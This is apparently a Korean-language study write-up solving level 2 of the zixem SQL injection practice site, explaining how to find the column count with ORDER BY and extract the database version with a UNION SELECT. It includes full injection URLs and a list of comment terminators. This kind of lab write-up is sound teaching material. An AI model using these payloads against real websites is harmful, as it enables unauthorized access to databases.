# <p align="center">💉level 2</p>
> -문제 풀이
>> - 문제 조건
>> 1. zixem은 내가 원하는 데이터를 띄우는게 목적이다.
>> ##### ㅤㅤ※우리가 원하는 데이터는 SQL의 버전으로 하겠다. 
>
>> - 문제 풀이
>> 1. 일단 sqli가 되는 환경인지 알아보기 위해 에러 유발인자를 넣어본다.
>> 2. sqli가 되는 환경인걸 확인했으면 order by를 사용해 컬럼의 갯수 확인한다.<br/>
>>https://www.zixem.altervista.org/SQLi/level2.php?showprofile=4 order by 10000-- (X)<br/>
>>https://www.zixem.altervista.org/SQLi/level2.php?showprofile=4 order by 0-- (X)<br/>
>> -> 아무것도 표시되지 않음
>> 3. 2가지의 조건을 바꿔준다. 주석과 싱글쿼터<br/>
>>https://www.zixem.altervista.org/SQLi/level2.php?showprofile=4' order by 3--+(X)<br/>
>> -> 이제 에러메세지 출력<br/>
>>https://www.zixem.altervista.org/SQLi/level2.php?showprofile=4' order by 4--+(O)<br/>
>> -> level1과 다르게 정확히 맞춰야 가능
>> 4. 이제 union select가 가능한지 보고 원하는 값 입력해준다.
>>https://www.zixem.altervista.org/SQLi/level2.php?showprofile=4%27%20union%20select%20version(),2,3,4--+-<br/>
>
>> - 추가 설명<br/>
>> 1. level 1과 다르게 사이트를 벗겨주는게 따로 필요하지 않았다.
>> 2. 주석으로는 %23, -- -, --+, --+- 등이 가능